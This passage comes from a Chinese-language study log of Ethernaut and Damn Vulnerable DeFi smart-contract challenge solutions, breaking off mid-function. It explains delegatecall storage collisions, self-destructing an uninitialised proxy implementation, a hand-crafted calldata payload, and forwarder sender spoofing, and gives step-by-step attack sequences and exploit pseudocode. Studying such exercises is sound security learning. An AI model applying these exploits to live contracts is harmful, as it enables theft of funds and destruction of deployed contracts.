    - 第二組 `multicall()` 之所以可以再次呼叫 `deposit()`，是因為 `depositCalled` 的狀態值只存在於當前的 Call Frame
      - `depositCalled`  是一個假的重入鎖，實際上根本不起作用，因為 `depositCalled = True` 的這個狀態，只存在於當前的 Call Stack
- 解法總結:
  1. 呼叫 `PuzzleProxy.proposeNewAdmin(_newAdmin=tx.origin)`  (使 `tx.origin` 成為了 `PuzzleWallet.owner`)
  2. 呼叫 `PuzzleProxy.addToWhitelist(addr=tx.origin)` (使 `tx.origin` 變成了 `whitelisted`)
  3. 建構 `PuzzleWallet.multicall()` 的 `bytes[] data`
     1. 總共有兩組 `bytes data` 需要建構
     2. 第一組: `deposit()`
     3. 第二組 `multicall(deposit())`
  4. 呼叫 `PuzzleProxy.multicall()`，並且帶入 `msg.value = 0.001 ETH`
  5. 呼叫 `PuzzleProxy.execute(to=tx.origin, value=0.002 ETH, data="")` (把 0.002 ETH 提領出來，使 `PuzzleProxy` 的以太幣餘額歸零)
  6. 呼叫 `PuzzleProxy.setMaxBalance(_maxBalance=uint256(uint160(tx.origin)))` (用來覆蓋 `PuzzleProxy.admin`)
  7. 過關！
- 知識點: Delegate Call, Storage Slot Collision
- 


解法:

- [Ethernaut24-PuzzleWallet.sh](/Writeup/DeletedAccount/Ethernaut24-PuzzleWallet.sh)
- [Ethernaut24-PuzzleWallet.s.sol](/Writeup/DeletedAccount/Ethernaut24-PuzzleWallet.s.sol)

#### [Ethernaut-25] Motorbike

個人覺得這一題十分有用，屬於必看必解題！

**此關卡在 Dencun 升級後無法被解掉，因為 Dencun 升級後，不允許 selfdestruct() 清空合約代碼** (除非欲 selfdestruct 的合約是在同一個 Transaction 創建的)

- 破關條件: 把 `Engine` 合約自毀掉
- 解法:
  - Instance 將會是 `Motorbike` 合約
  - 透過觀察 `Motorbike` 合約，我們可以觀察到它的 `constructor()` 調用了 `Engine.initialize()` 函數
  - 在 `Engine.initialize()` 函數內，我們可以觀察到它為 `Motorbike` 的 slot0 和 slot1 分別設置了 `1000` 與 `msg.sender`
    - 我們可以透過以下指令驗證這件事:
    - `cast storage -r $RPC_OP_SEPOLIA $MOTORBIKE_INSTANCE 0` -> msg.sender
    - `cast storage -r $RPC_OP_SEPOLIA $MOTORBIKE_INSTANCE 1 | cast to-dec` -> 1000
  - 如果要讓 `Engine` 自毀掉，我們必須找到一個地方，可以以 `Engine` 的 context 去呼叫自毀合約的邏輯代碼
  - 這個任意執行代碼的觸發點，看起來在 `Engine._upgradeToAndCall()` 函數內
    - 但 `Engine._upgradeToAndCall()` 是 internal 函數
  - 我們只能透過 `Engine.upgradeToAndCallI()` 函數來訪問它
  - 但是我們必須要通過 `require(msg.sender == upgrader)` 的檢查，意味著我們得先讓自己成為 `upgrader`
  - 只有 `Engine.initialize()` 可以設置 upgrader，也就是 `Motorbike` 的 slot0
  - 漏洞點在於 `Engine` 本身也是一個部署在網路上的 Logic 合約
  - 但是 `initialize()` 函數只會經過 `initializer` 這個 modifier 的檢查
  - `initializer` 簡單來說會檢查當前這個合約的 context 是不是已經被 initialized
  - 如果沒有被 initialized，則 `initializer` 的檢查通過，可以繼續進行被掛載了 `initializer` modifier 的合約
    - 具體來說，代碼可以參考這裡 https://github.com/openzeppelin/openzeppelin-contracts/blob/8e02960/contracts/proxy/Initializable.sol#L36
  - 但是回過頭來看 `Motorbike` 合約是使用 delegatecall 來進行 `Engine.initialize()`
  - **這意味著只有 `Motorbike` 被 initialized 了，但是 `Engine` 本身並沒有被 initialized**
    - 請記住: `Engine` 本身也是部署在網路上的一個合約
  - 所以此時我們如果直接呼叫 `Engine.initialize()` (a.k.a. 不透過 `Motorbike`) 是可以呼叫成功的
    - 因為 `Initializable` 這個抽象合約的 `require(_initializing || _isConstructor() || !_initialized)` 檢查會通過
  - 於是我們就可以成功變成 `upgrader`
  - 變成了 `Engine.upgrader` (Motorbike.slot0) 之後，我們就可以呼叫 `Engine.upgradeToAndCall()` 了
  - 我們可以呼叫 `Engine._upgradeToAndCall()` 使 `Engine` 執行我們部署好的合約的 `selfdestruct` 指令了
- 解法總結:
  - 我們需要先寫一個 `BustingEngine` 合約
  - 裡面有一個會執行 `selfdestruct()` 的函數，我們就叫它 `bust()` 好了。
  - 用自己的錢包，呼叫 `Engine.initialize()`，使自己的錢包成為 `upgrader`。
    - `Engine` 合約地址，可以透過 `cast storage -r $RPC_OP_SEPOLIA $MOTORBIKE_INSTANCE 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc` 找到
  - 用自己的錢包，呼叫 `Engine.upgradeToAndCall(newImplementation＝BustingEngine, data="bust()")`
    - `Engine` 會透過 delegatecall 借用我們的 `selfdestruct()` 邏輯代碼，把自己銷毀掉
  - 過關！
    - 過程中我們除了需要和 `Motorbike` 獲取 `Engine` 的實際合約地址以外，基本上不需要和 `Motorbike` 互動。
  
解法:

- [Ethernaut25-Motorbike.sh](/Writeup/DeletedAccount/Ethernaut25-Motorbike.sh)
- [Ethernaut25-Motorbike.s.sol](/Writeup/DeletedAccount/Ethernaut25-Motorbike.s.sol)

### 2024.09.06


#### [Ethernaut-26] DoubleEntryPoint

- 卡關了...沒看得很懂這題要做什麼才能過關，先跳過，改天再回頭看
- 明天要比工作日還要早起出門上課，先解 Ethernaut-27 水題當作簽到...


#### [Ethernaut-27] Good Samaritan

- 破關條件: 把 `Wallet` 合約的 `Coin.balances`  清空
- 解法:
  - 已知我們可以透過 `GoodSamaritan.requestDonation() -> Wallet.donate10()` 把幣取走，但這意味著我們得呼叫 100000 次才能過關，太慢了
  - 除了 `Wallet.donate10()` 以外，還有 `Wallet.transferRemainder()` 可以直接把所有 balances 轉走，這應該就是我們要找到的利用點
  - 我們要找到一個地方使得 `Wallet.transferRemainder()` 被觸發，進而過關
  - 要做到這件事，只能使 `if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err))` 敘述返回 True
  - 這意味著我們要在 `try wallet.donate10(msg.sender)` 的執行過程中想辦法觸發 `NotEnoughBalance()` 這個 custom error
  - 只要 `dest_` 是一個合約，我們就可以使 `Coin.transfer()` 呼叫 callback function: `INotifyable(dest_).notify(amount_);`
  - 然後我們在 `INotifyable(dest_).notify(amount_);` 的執行過程中觸發 `NotEnoughBalance()` custom error 就好了！
- 解法總結:
  - 寫一個合約，它會呼叫 `GoodSamaritan.requestDonation()`
  - 這個合約需要實現一個 `notify(uint256)` 函數
  - 這個 `notify(uint256)` 函數會無條件地觸發 `NotEnoughBalance()` custom error

吐槽: 這題居然三顆星...前一題解不出來，它居然只有兩顆星？？？囧

- [Ethernaut27-GoodSamaritan.sh](/Writeup/DeletedAccount/Ethernaut27-GoodSamaritan.sh)
- [Ethernaut27-GoodSamaritan.s.sol](/Writeup/DeletedAccount/Ethernaut27-GoodSamaritan.s.sol)

### 2024.09.07

- 今天上防衛課一整天，爆幹累
- 但還是要要求自己至少解一題...

#### [Ethernaut-28] Gatekeeper Three

打開題目後快速掃了一下，感覺是最簡單的 Gatekeeper，應該是要複習前面學到的內容。

- 破關條件：通過 `enter()` 的三道 modifier 考驗，使自己成為一個 entrant
- 解法:
  - `gateOne()`，沒什麼難的
    - 需要寫一個合約，呼叫 `construct0r()` 使自已的合約(`msg.sender`)成為 `owner`
  - `gateTwo()`，使 `allowEntrance` 為 True
    - 需要呼叫 `trick.checkPassword(_password)` 並使它返回 True
    - 但 `trick` 此時還沒被賦值，所以要先呼叫 `createTrick()` 使 `trick` 被 new 出來
    - 然後，再呼叫 `SimpleTrick.checkPassword(_password)`
      - `password` 是 private 的，所以我們不太能直接用 Solidity 呼叫得到
      - 但我們可以用 `eth_getStorage` 先在鏈下拿到 password
      - 意味著我們要先呼叫 `GatekeeperThree.createTrick()` 再執行一系列操作
    - `gateThree()` 要求 `GatekeeperThree` 合約至少有 0.001 ETH 以上
      - 並且轉回來給攻擊合約是失敗的
      - 這意味著我們要寫一個 `receive()` 函數，裡面返回 False
      - 我們可以直接用 `revert()` 來做到 `.send()` 會返回 False 這件事
  - 解法整理:
    - 寫一個攻擊合約
    - 攻擊合約會先呼叫 `GatekeeperThree.createTrick()`
    - 然後用 `eth_getStorage` 獲取到 `SimpleTrick.slot2` 的內容值，作為 `password`
    - 呼叫 `GatekeeperThree.getAllowance(password)` 把 `password` 帶進去
    - 呼叫 `GatekeeperThree.construct0r()` 使攻擊合約成為 `owner`
    - 給 `GatekeeperThree` 0.001 以上的 ether
    - 攻擊合約也需要寫一個 `receive()` 函數，裡面只有寫了一行 `revert()`
    - 完成，呼叫 `enter()` 來過關！

- [Ethernaut28-GatekeeperThree.sh](/Writeup/DeletedAccount/Ethernaut28-GatekeeperThree.sh)
- [Ethernaut28-GatekeeperThree.s.sol](/Writeup/DeletedAccount/Ethernaut28-GatekeeperThree.s.sol)zz

過程中好像 Submit Instance 按太快，導致關卡通過一直失敗，一頭霧水XD

### 2024.09.09

- 繼續進行每日解一題挑戰

#### [Ethernaut-29] Switch

主要是考 Calldata 的 Layout 的一題，不難，值得一看。

- 破關條件：使 `switchOn` 為 True。
- 解法:
  - 為了使 `switchOn` 為 True，我們必須使 `Switch` 合約自己呼叫 `turnSwitchOn()` 函數
  - 由於存在 `onlyThis` modifier 的關係，我們唯一的進入點是 `flipSwitch(bytes memory _data)` 函數
  - 我們必須透過 `.call(_data)` 來調用 `turnSwitchOn()` 但同時通過 `onlyOff` 的檢查
  - `onlyOff` 會檢查從 calldata 起開始算，第 68 bytes 到第 72 bytes 必須是 `turnSwitchOff()` 的 selector。(也就是 `0x20606e15`)

- 我們可以試著把 `flipSwitch(bytes memory _data)` 拆解出來，看它的整段 calldata 預計會長什麼樣子：
- 每一行都是一段 32bytes 資料

```
30c13ade                                                         # flipSwitch(bytes memory _data)
???????????????????????????????????????????????????????????????? # 暫時留空，待會填入
???????????????????????????????????????????????????????????????? # 暫時留空，待會填入
20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
```

- 好的，我們找到 `turnSwitchOff()` 要塞在哪裡了，接下來要把 `bytes memory _data` 的偏移量(offset)和長度(length)填進去
- 偏移量是什麼？偏移量代表從 calldata 的起點，要離多遠才會指到 `bytes memory _data` 的長度(length)
- 記住: 動態資料結構的 Layout 是 `offset + length + data`

```
30c13ade                                                         # flipSwitch(bytes memory _data)
0000000000000000000000000000000000000000000000000000000000000020 # bytes memory _data 的偏移量。從 0 點加上 32 bytes 可以指向 length 所以是 0x20
0000000000000000000000000000000000000000000000000000000000000004 # bytes memory _data 的長度，總長度只有 4 bytes
20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
```

- 好的，目前我們已經可以成功通過 `onlyOff` 的檢查了。可是我們要怎麼利用 `address(this).call(_data)` 來呼叫到 `turnSwitchOn()` 函數呢？
- 我們可以回頭整理一下，目前 `_data` 會是什麼資料:

```
0000000000000000000000000000000000000000000000000000000000000020 # bytes memory _data 的偏移量。從 0 點加上 32 bytes 可以指向 length 所以是 0x20
0000000000000000000000000000000000000000000000000000000000000004 # bytes memory _data 的長度，總長度只有 4 bytes
20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
```

- 誒...既然程式不會對**偏移量**和**資料長度**做任何檢查，是不是意味著我們可以直街操縱偏移量和長度，使它執行我們想要執行的任何函數呢？
- 畢竟只要不動到 `turnSwitchOff()` calldata 的位置就好了，動到它就通過不了 `onlyOff` 的檢查了。
- 試著自己構造看看:

```
30c13ade                                                         # flipSwitch(bytes memory _data)
???????????????????????????????????????????????????????????????? # 原先 bytes memory _data 的偏移量，暫時留空，待會填入
???????????????????????????????????????????????????????????????? # 原先 bytes memory _data 的長度，暫時留空，待會填入
20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
???????????????????????????????????????????????????????????????? # 暫時留空，待會填入
76227e1200000000000000000000000000000000000000000000000000000000 # turnSwitchOn()
```

- 好的，現在把呼叫 `address(this).call(_data)` 裡面的 `_data` 的前 4 bytes 放進來了
- 接下來一樣需要調整這一段 `_data` 的總長度:

```
30c13ade                                                         # flipSwitch(bytes memory _data)
???????????????????????????????????????????????????????????????? # 原先 bytes memory _data 的偏移量，暫時留空，待會填入
???????????????????????????????????????????????????????????????? # 原先 bytes memory _data 的長度，暫時留空，待會填入
20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
0000000000000000000000000000000000000000000000000000000000000004 # 這裡代表 turnSwitchOn() 的 4bytes 長度
76227e1200000000000000000000000000000000000000000000000000000000 # turnSwitchOn()
```

- 有了 `address(this).call(_data)` 的 `_data` 的長度之後，需要再調整 offset

```
30c13ade                                                         # flipSwitch(bytes memory _data)
0000000000000000000000000000000000000000000000000000000000000060 # bytes memory _data 的偏移量，跳轉到加料過的 calldata 長度定位點
???????????????????????????????????????????????????????????????? # 原先 bytes memory _data 的長度，暫時留空，待會填入
20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
0000000000000000000000000000000000000000000000000000000000000004 # 這裡代表 turnSwitchOn() 的 4bytes 長度
76227e1200000000000000000000000000000000000000000000000000000000 # turnSwitchOn()
```

- 原先 bytes memory _data 的長度，已經不重要了，因為我們已經用新的長度定位點來取代
- 所以留空就好
- 最後我們得到:

```
30c13ade                                                         # flipSwitch(bytes memory _data)
0000000000000000000000000000000000000000000000000000000000000060 # bytes memory _data 的偏移量，跳轉到加料過的 calldata 長度定位點
0000000000000000000000000000000000000000000000000000000000000000 # 原先 bytes memory _data 的長度，已經不重要，亂填都可以
20606e1500000000000000000000000000000000000000000000000000000000 # turnSwitchOff()
0000000000000000000000000000000000000000000000000000000000000004 # 這裡代表 turnSwitchOn() 的 4bytes 長度
76227e1200000000000000000000000000000000000000000000000000000000 # turnSwitchOn()
```

- 最後我們用來發起呼叫 `flipSwitch(bytes memory _data)` 的 `_data` 就是:

```solidity=
bytes memory data = hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"
```

- 完成！

- [Ethernaut29-Switch.sh](/Writeup/DeletedAccount/Ethernaut29-Switch.sh)
- [Ethernaut29-Switch.s.sol](/Writeup/DeletedAccount/Ethernaut29-Switch.s.sol)

### 2024.09.10

- 繼續進行每日解一題挑戰

#### [Ethernaut-30] HigherOrder

- 過關條件: 使 `treasury` 的內容值變成大於 255
- 解法:
  - 這題的關鍵點在於 `pragma solidity 0.6.12;`
  - 在 Solidity 0.8.0 以前，編譯器用的是 `ABIEncoderV1`
  - 使用 `ABIEncoderV1` 意味著編譯出來的合約，並不會對 calldata 做邊界檢查
  - https://docs.soliditylang.org/en/v0.8.1/080-breaking-changes.html?highlight=abicoder#silent-changes-of-the-semantics
  - 所以我們手動建構 calldata 丟進去就可以了，不用管 calldata 有 `uint8` 的限制
  - 要修復此問題，我們可以在合約指定 `pragma experimental ABIEncoderV2;` 即可
  - 我做了兩個版本的 forge 腳本，一個是 for 通關用的
    - `forge script Ethernaut30-Switch.s.sol:Solver -f $RPC_OP_SEPOLIA -vvvv --broadcast`
  - 另一個是相同的通關腳本，但是使用了上 patch 的關卡，執行下去可以發現會 `revert()`
    - `forge script Ethernaut30-Switch.s.sol:SolverV2 -f $RPC_OP_SEPOLIA -vvvv`

- [Ethernaut30-HigherOrder.sh](/Writeup/DeletedAccount/Ethernaut30-HigherOrder.sh)
- [Ethernaut30-HigherOrder.s.sol](/Writeup/DeletedAccount/Ethernaut30-HigherOrder.s.sol)
- [Ethernaut30-HigherOrderV2.sol](/Writeup/DeletedAccount/Ethernaut30-HigherOrderV2.sol)


### 2024.09.11

- 繼續進行每日解一題挑戰

#### [Ethernaut-31] Stake

- 過關條件:
  1. `Stake` 合約內的以太幣餘額大於 0
  2. `totalStaked` 必須大於 `Stake` 合約的以太幣餘額
  3. 我們必須成為一個 `Stakers`
  4. 我們的 `UserStake` 必須為 0
- 解法:
  - 這個合約是 Solidity 0.8.0 編譯的，所以 overflow/underflow 看起來是不可行了
    - 所以看起來 `StakeETH()` 沒什麼漏洞
  - `Unstake()` 看起來有一個小問題: 沒有要求 `bool success` 必須為 True
  - `0xdd62ed3e` 是 `allowance(address,address)`
  - `0x23b872dd` 是 `transferFrom(address,address,uint256)`
  - 由於沒有給出 `WETH` 的代碼，我們就先樂觀地假定它是一個正常的 ERC20 合約，漏洞不出在它身上
  - `(,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));` 這邊沒有檢查 call 是否成功，只有把 return value 當作 uint256 做後續處理
  - 由於不清楚 `WETH.allowanapprovece(address,address)` 的具體實現方式，所以我們也不知道 `allowance` 究竟會是什麼值
  - 但是題目說明提示我們要看 ERC20 的實現方式，我們可以樂觀的認為 WETH 應該也是個繼承了 ERC20 的合約
  - `bytesToUint(bytes memory data)` 函數看起來也挺正常的，漏洞應該不在這裡。
  - **`(bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));` 沒有檢查 transfered 是否成功，即便 `transfered == false` 也給過！！!**
  - 這意味著我們有沒有 WETH 都沒差
    - 從這一個思路往下看，似乎也沒有任何地方聲明有發給我們一些 `WETH`
  - 那我們就可以從這一點開始思考怎麼建構 exploit 了
- 解法總結:
  - 使用我們自己的 EOA 錢包
    - 呼叫 `StakeETH{value: 0.001 ether + 1}()` 來滿足條件 1 和 3
    - 呼叫 `Unstake(amount=0.001 ether + 1)` 來滿足條件 4，但同時取消滿足了 1
    - 目前只有滿足 3 和 4，我們先來思考怎麼滿足條件 2
  - 寫一個合約 (為了不要使用 EOA 錢包，保持滿足條件 4)
    - 呼叫 `StakeWETH(amount=0.001 ether + 1)` 來滿足條件 2
      - 在這之前會需要呼叫 `approve(address,uint256)`
    - 呼叫 `StakeETH()` 然後在 `Unstake()` 來滿足條件 1
      - 記得要保留 1 wei 在裡面才能滿足條件 1
  - 把合約 `destruct()` 掉，把過程中用到的 0.001 ether 轉回來給 EOA

- [Ethernaut31-Stake.sh](/Writeup/DeletedAccount/Ethernaut31-Stake.sh)
- [Ethernaut31-Stake.s.sol](/Writeup/DeletedAccount/Ethernaut31-Stake.s.sol)


### 2024.09.12

- 繼續進行每日解一題挑戰

#### [DamnVulnerableDeFi-01] Unstoppable

- 過關條件: 使 `_isSolved()` 通過執行
- 合約代碼解讀筆記:
  - 從 `_isSolved()` 的代碼注視我們可以觀察到，我們需要使 `Monitor.checkFlashLoan()` 的 [vault.flashLoan()](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/unstoppable/UnstoppableMonitor.sol#L41) 拋出 Error
    - 這樣才能使 `Vault` 被 paused 並且 transferOwner 給 deployer
  - 所以，我們基本上只需要重點關注 `Vault.flashLoan()` 裡面的漏洞即可，其他的程式碼大概都是煙霧彈
  - 有四個地方可以讓 `Vault.flashLoan()` 執行過程中拋出錯誤
    1. revert InvalidAmount(0);
    2. revert UnsupportedCurrency();
    3. revert InvalidBalance();
    4. revert CallbackFailed();
  - `revert InvalidAmount(0);` 這個不可能，因為 Monitor 已經在[這裡](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/unstoppable/Unstoppable.t.sol#L106)把 amount 寫死了
  - `revert UnsupportedCurrency();` 也不可能，因為 Monitor 一樣在[這裡](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/unstoppable/UnstoppableMonitor.sol#L39)寫死了，這裡的 `.asset()` 是一個 `immutable`，完全沒有操縱的可能性
  - `revert CallbackFailed();` 基本上也不太可能
    - 因為看起來 `Monitor.UnexpectedFlashLoan()` error 也基本上沒辦法被 `Vault` 合約觸發到
  - 唯一比較有機會的感覺是觸發 `revert InvalidBalance();`
  - 這可能會需要我們操縱 `balanceBefore`
  - 順帶一提，有 `balanceBefore` 但是沒有 `balanceAfter` 本身感覺就蠻奇怪的
  - 已知 `balanceBefore` 可以視為 `asset.balanceOf(address(this))`
  - 即: 在 `Vault` 提供呼叫者 flashLoan 之前，Vault 持有多少個 `asset`
  - 現在思考的點: **如何使 Monitor 在呼叫 `Vault.flashLoan()` 的時候，使 [convertToShares(totalSupply) != balanceBefore](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/unstoppable/UnstoppableVault.sol#L85) 返回 True?**
  - 我們從 `Vault` 的程式碼中可以觀察到一件事: **這個合約基本上不存在對 ERC4626 的 supply 和 shares 的額外操作**
  - 那麼就意味著沒意外的話，我們可以認為 `convertToShares(totalSupply)` 是**樂觀地**假定返回值會始終等於 `Vault` 合約持有的 DVT 代幣數量
  - 但萬一 Vault 持有的 DVT 代幣數量已經被操縱了呢？那麼 `convertToShares(totalSupply)` 的返回值就會和 `Vault` 合約實際持有的 DVT 代幣數量對不上
  - 對不上的話，任何人來呼叫 `Vault.flashLoan()` 就都會拋出 `InvalidBalance()` Error
- 解法整理:
  - 利用關卡一開始發給我們的 10 顆 DVT 代幣
  - 把這 10 顆 DVT 代幣轉帳給 `Vault` 合約
  - 使它 `convertToShares(totalSupply) == balanceBefore == asset.balanceOf(address(this))` 對不上來
  - 對不上來的時候，就會讓任何人(包含`Monitor`)呼叫 `Vault.flashLoan()` 時，拋出 `revert InvalidBalance();`
  - 當 Monitor 遇到 `revert InvalidBalance();` error 的時候，就會把 `Vault` paused 掉、把 owner 轉回給 `deployer`
- 解法代碼:

```solidity
function test_unstoppable() public checkSolvedByPlayer {
    token.transfer(address(vault), 10e18);
}
```

- 心得: 哎呀，解法其實超簡單，Damn Vulnerable DeFi 系列感覺是花更多時間在理解題目的代碼在寫什麼，蠻考驗 Code Review/Audit 的能力...

- [DamnVulnerableDeFi-01-Unstoppable.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-01-Unstoppable.t.sol)

### 2024.09.13

- 繼續進行每日解一題挑戰

#### [DamnVulnerableDeFi-02] Naive receiver

- 過關條件: 把 `NaiveReceiverPool` 和 `FlashLoanReceiver` 合約的 WETH 餘額全部轉到題目指定的 recovery 帳號
  - `NaiveReceiverPool` 有 1000 顆 WETH
  - `FlashLoanReceive` 有 10 顆 WETH
- 合約代碼解讀筆記:
  - 從題目名稱來猜測，這題大概率是一個"輸入參數未經驗證"之類的漏洞
  - 既然要榨乾 `NaiveReceiverPool` 和 `FlashLoanReceiver` 合約的餘額，那首先看一下有沒有相關代碼可以觸發這件事
  - 只有三個地方可以做到這件事:
    1. [flashLoan() 函數的 weth.transfer(address(receiver), amount);](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/NaiveReceiverPool.sol#L50)
    2. [flashLoan() 函數的 weth.transferFrom(address(receiver), address(this), amountWithFee);](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/NaiveReceiverPool.sol#L58) 可以把 `FlashLoanReceiver` 合約的餘額轉走
    3. [withdraw() 函數的 weth.transfer(receiver, amount);](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/NaiveReceiverPool.sol#L72)
  - `NaiveReceiverPool` 合約的 external 函數都沒有什麼訪問限制(沒有modifier)，只有驗證傳入的 `token` 是否為 WETH 而已
  - `FlashLoanReceiver` 看起來有一個可能觸發 overflow/underflow 的地方 [amountToBeRepaid = amount + fee;](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/FlashLoanReceiver.sol#L31)
    - 但是，實際上好像沒什麼用。
    - 原本想讓 `FlashLoanReceiver` approve 10 顆 WETH 給 `NaiveReceiverPool`，然後 `NaiveReceiverPool` 就有 1000 + 10 WETH 可以被轉走。
    - 這條路看起來是行不通的。畢竟 Pool 只是 transferFrom 了原本發起的借款額 + 1 顆 WETH，`FlashLoanReceiver` 原本持有的 10 顆還是會繼續留在 `FlashLoanReceiver`。
  - 那麼，要把 `FlashLoanReceiver` 的 10 顆 WETH 榨乾，看起來只剩下透過 `flashLoan()` 的 `FIXED_FEE`，一點一點地把 Receiver 的 WETH 轉到 Pool 去。
  - 所以 `FlashLoanReceiver` 需要發起 10 次 `flashLoan()` 來把自己的 WETH 當作 Fee 被 Pool 收繳走
  - 然後我們再來想辦法把 `NaiveReceiverPool` 持有的 WETH 榨乾。
  - 要把 `NaiveReceiverPool` 持有的 WETH 榨乾，從剛剛的分析我們可以知道透過 `flashLoan()` 基本上是行不通的。
    - 因為即使 `transfer()` 1000 顆走，還是會被 `transferFrom()` 1000+1 顆回來
  - 所以唯一的路剩下 `withdraw()`
  - 我們先看 `totalDeposits -= amount;` 是否可能不夠扣
  - [在 deploy `NaiveReceiverPool` 的時候，`totalDeposits` 也增加了 1000 顆 WETH](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/test/naive-receiver/NaiveReceiver.t.sol#L45)
  - 所以，`totalDeposits` 應該會是 (部署時放進去的 1000 顆 WETH + `NaiveReceiver` 被收繳的手續費 10 顆 WETH) 
    - 也就是說 `totalDeposits` 至少有 (1000 + 10)e18
    - 足夠讓我們發起 `withdraw(amount=1010e18)` 了
  - 再來要思考 `deposits[_msgSender()] -= amount;` 中存在的漏洞
  - 從 [_msgSender() 的代碼](https://github.com/theredguild/damn-vulnerable-defi/blob/d22e1075c9687a2feb58438fd37327068d5379c0/src/naive-receiver/NaiveReceiverPool.sol#L87) 中我們可以觀察到，當 caller 是 `BasicForwarder` 合約的時候，我們就有機會操縱 `_msgSender()` 的返回值
  - `BasicForwarder` 基本上是要我們建構基於 EIP712 簽名過的 Request，然後 `BasicForwarder` 合約就會幫我們代為呼叫 Request
  - Request 裡面要塞什麼？
    - 利用 `multicall()` 幫我們做一系列動作
      - 呼叫十次 `flashLoan(receiver=FlashLoanReceiver, token=WETH, amount=1e18, data="")` 函數 (為了把 Receiver 持有的 WETH 透過手續費的方式給到 Pool)
      - 用 low-level call 的方式，呼叫 `withdraw(amount=1020e18, receiver=tx.origin)`，並且在 calldata 內附加 `deployer` 的地址
        - 必須用 low-level call 的方式，才能使 `_msgSender()` 返回 `deployer` 的地址
        - 以便於通過 `deposits[_msgSender()] -= amount;`
  - 怎麼把 Request 塞給 `BasicForwarder.execute(Request calldata request, bytes calldata signature)`？
    - `request.from` 是自己
    - `request.target` 當然是 pool
    - `request.value` 雖然可以使用 payable 但這邊用不到，所以塞 0 即可
    - `request.gas` 隨便塞個大數都可以，就塞 3000m 好了
    - `request.nonce` 因為我們在 Foundry 玩，用的是 test account，所以塞 0 就好
    - `request.data` 按照上述所說，組成一個 `multicall()` 的呼叫
    - `request.deadline` 不重要，給個大數或 `block.timestamp` 都可以
  - 最後再依照 EIP712 的標準，算出 signature，應該就可以調用 `BasicForwarder.execute()` 來通過了

將上述的解題想法組成一部分偽代碼

1. 先組建 `NaiveReceiverPooll.multicall(bytes[] calldata data)` 的 ABI Calldata

```solidity=
# 已知會有 10 + 1 組 data

# 前 10 組 - 用來把 receiver 的 WETH 透過手續費的方式，轉給 pool
# flashLoan(receiver=FlashLoanReceiver, token=WETH, amount=1e18, data="")
data[0] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
data[1] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
data[2] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
data[3] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
data[4] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
data[5] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
data[6] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
data[7] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
data[8] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
data[9] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
data[10] = abi.encodeCall(pool.flashLoan, (IERC3156FlashBorrower(receiver), address(WETH), 1e18, bytes("")))
# 第 11 組 - 利用 _msgSender() 藏的後門，把 pool 的資金全部提走
# withdraw(amount=1010e18, payable receiver=player) + address(deployer)
data[11] = abi.encodeCall(pool.withdraw, (1000e18+10e18, payable(player)), deployer)
```

2. 把 `NaiveReceiverPooll.multicall(bytes[] calldata data)` 組成一個 `BasicForwarder.Request`

```
BasicForwarder.Request({
  from: player,
  value: 0,
  gas: 30000000,
  nonce: 0,
  data: abi.encodeCall(pool.multicall, data),
  deadline: type(uint256).max
})
```

3. 算出 `BasicForwarder.Request` 的 signature

```solidity
digest = keccak256(abi.encodePacked(
  "\x19\x01",
   forwarder.domainSeparator(),
   forwarder.getDataHash(request)
))

(uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
bytes memory signature = abi.encodePacked(r, s, v);
```

4. 執行 `BasicForwarder.execute(request, signature);`
5. 現在 player 應該持有所有的 WETH 了，轉去 `recovery` 帳號去，破關


解答程式碼:
```solidity
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

function test_naiveReceiver() public checkSolvedByPlayer {
